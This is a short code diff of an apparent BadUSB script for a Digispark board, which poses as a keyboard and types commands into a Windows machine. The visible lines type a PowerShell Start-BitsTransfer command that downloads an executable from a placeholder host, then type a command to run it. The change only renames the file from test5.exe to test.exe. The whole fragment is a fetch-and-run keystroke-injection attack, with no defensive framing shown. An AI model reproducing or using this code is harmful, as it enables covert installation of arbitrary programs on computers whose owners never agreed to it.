@@ -44,11 +44,11 @@ void loop() {
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(20000);
-  DigiKeyboard.print("Start-BitsTransfer http://[host-ip]/uploads/test5.exe test5.exe");
+  DigiKeyboard.print("Start-BitsTransfer http://[host-ip]/uploads/test.exe test.exe");
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
-  DigiKeyboard.print("./test5.exe");
+  DigiKeyboard.print("./test.exe");
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
